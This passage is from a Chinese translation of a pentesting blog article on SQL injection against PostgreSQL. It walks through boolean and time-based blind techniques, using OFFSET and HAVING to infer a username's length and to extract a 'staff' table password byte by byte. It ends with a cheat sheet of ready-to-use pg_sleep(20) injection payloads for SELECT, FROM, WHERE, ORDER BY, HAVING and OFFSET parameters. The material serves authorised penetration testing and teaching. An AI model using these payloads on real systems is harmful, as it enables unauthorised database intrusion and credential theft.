下面将对该查询的过程进行尝试性的解释:
  1. 如果第一个COUNT函数没有返回零，那么对于ORDER BY，我们得到最终的true或false。
  2. 正确或错误取决于内部选择(第二个查询是核心判断的)。
  3. 内部选择将休眠20秒，或者什么也不返回。
  4. 这取决于人员表中用户的首字母是否以M开头（这是`SELECT username FROM staff WHERE username SIMILAR TO 'M%'`部分）。 
### OFFSET
此子句允许您仅检索由其余查询生成的一部分行。OFFSET将从输出的行的开头删除分配给它的行数，而LIMIT则从末尾删除它们。
如果在返回大量数据的某种东西中发现了这种SQL注入，则可以使用从输出开头删除的行数来确定字符串的长度，甚至可以通过将字符转换为ASCII码来确定字符的长度。
例如，使用LENGTH函数： `dvdrental=# SELECT address FROM address OFFSET 0;`将返回：
    47 MySakila Drive
     28 MySQL Boulevard
     23 Workhaven Lane
     1411 Lillydale Drive
     1913 Hanoi Way
     1121 Loja Avenue
     692 Joliet Street
     1566 Inegl Manor
     53 Idfu Parkway
     1795 Santiago de Compostela Way
     900 Santiago de Compostela Parkway
     478 Joliet Way
     613 Korolev Drive
     1531 Sal Drive
     1542 Tarlac Parkway
因此，我们现在可以按照以下方式进行操作： `SELECT address FROM address OFFSET 0|(SELECT
LENGTH((SELECT username FROM staff WHERE username SIMILAR TO 'M%')));`
    1913 Hanoi Way
     1121 Loja Avenue
     692 Joliet Street
     1566 Inegl Manor
     53 Idfu Parkway
     1795 Santiago de Compostela Way
     900 Santiago de Compostela Parkway
     478 Joliet Way
     613 Korolev Drive
     1531 Sal Drive
     1542 Tarlac Parkway
因此，我们可以看到输出中的前四行已被删除，这意味着工作人员表中以 "M"开头的用户名长度为4个字符。
此外，基于OFFSET子句是否删除行，我们可以逐字节地尝试增加字符。像这样： `SELECT address FROM address OFFSET
0+(SELECT LENGTH((SELECT password FROM staff WHERE password SIMILAR TO '8%'
LIMIT 1)));`
这样会将要删除的行数设置为0 +（以“
8”开头的密码长度），因此，如果存在以8开头的密码，我们将看到返回的行数有所不同。这可以用来进一步检查每个字节，直到我们检索到整个密码值为止。
### HAVING
此参数接受一个条件，因此我添加了一个`AND`运算符以使之必须都为真，然后添加了条件，该条件将使我们可以逐字节对值进行暴力破解。
`t' AND (SELECT COUNT((SELECT password FROM staff WHERE password SIMILAR TO
'8%' LIMIT 1))) = 1; -- -`
同样，如果未显示输出，则可以使pg_sleep（）函数的大部分时间睡眠（如果为true）20秒钟，并使用它来确定条件输出。
## 快速测试漏洞
这些都是可以用于参数测试漏洞的导致应用程序进入睡眠状态并延迟响应时间并且快速有效payload。如果服务器响应时间随着有效负载而增加了明显的时间（大约20秒），则意味着应用程序容易受到攻击。
### SELECT
如果parameter是整数：
`pg_sleep(20); -- -`
如果参数是字符串：
`'||pg_sleep(20); -- -`
### FROM
**仅当有效负载的第一个SELECT子句中提供了有效的表名(TABLE)和列(COLUMN)时，这才有效**
    (SELECT * FROM [TABLE] WHERE [COLUMN]=1|(SELECT (SELECT CASE WHEN COUNT((SELECT pg_sleep(20)))<>0 THEN 1 ELSE 2 END))) ss; -- -    
或者
    (SELECT * FROM [TABLE] WHERE [COLUMN] = 'asd'::varchar||(SELECT (SELECT CASE WHEN COUNT((SELECT pg_sleep(20)))<>0 THEN 1 ELSE 2 END))) ss; -- -    
最后的"ss"是必要的，但可以是任何非保留字.
#### 当已知列需要一个Int
示例：
    (SELECT * FROM address WHERE address_id=1|(SELECT (SELECT CASE WHEN COUNT((SELECT pg_sleep(20)))<>0 THEN 1 ELSE 2 END))) ss; -- -    
完整查询
    SELECT address FROM (SELECT * FROM address WHERE address_id=1|(SELECT (SELECT CASE WHEN COUNT((SELECT pg_sleep(20)))<>0 THEN 1 ELSE 2 END))) ss; -- -
#### 当已知列需要字符串时
示例:
    (SELECT * FROM address WHERE address = 'asd'::varchar||(SELECT (SELECT CASE WHEN COUNT((SELECT pg_sleep(20)))<>0 THEN 1 ELSE 2 END))) ss; -- -    
完整查询：
    SELECT address FROM (SELECT * FROM address WHERE address = 'asd'::varchar||(SELECT (SELECT CASE WHEN COUNT((SELECT pg_sleep(20)))<>0 THEN 1 ELSE 2 END))) ss; -- -    
### WHERE
如果parameter是整数：
    1|(SELECT (SELECT CASE WHEN COUNT((SELECT pg_sleep(20)))<>0 THEN 1 ELSE 2 END)); -- -    
如果parameter是字符串:
    '||(pg_sleep(20)); -- -    
### ORDER BY
**注意，此操作实际上不会更改依赖于布尔型输出的输出顺序，因此一定要触发pg_sleep(20)**
    (SELECT CASE WHEN COUNT((SELECT pg_sleep(20)))<>0 THEN true ELSE false END); -- -    
### HAVING
如果parameter是整数：
    (COUNT((SELECT pg_sleep(20)))=1); -- -    
如果parameter是字符串：
    t' AND (SELECT COUNT((SELECT pg_sleep(20)))) = 1; -- -
### OFFSET
如果parameter是整数：
    1|(SELECT COUNT((SELECT pg_sleep(20)))); -- -    
如果parameter是字符串，请使用":: integer"将值转换为int字符串，然后使用与上述相同的有效负载(*tricks)
    1'::integer + 1|(SELECT COUNT((SELECT pg_sleep(20)))); -- -    
## 结论
总之，尽管我注意到该特定引擎缺少公开的SQL注入有效负载，但许多技术和方法已从其他DBMS转移到了postgreSQL。
正如我以前从未接触过postgreSQL一样，我认为这将是一个很好的机会，可以扩展我的技术知识，并且使自己熟悉此DBMS可能具有，而其他DBMS则不可能具有的功能。
## 参考文献
  * 
  * 
PS:  
本文为翻译文章:  
原文链接:[pentesting-postgresql-with-sql-injections](https://www.onsecurity.io/blog/pentesting-postgresql-with-sql-injections/)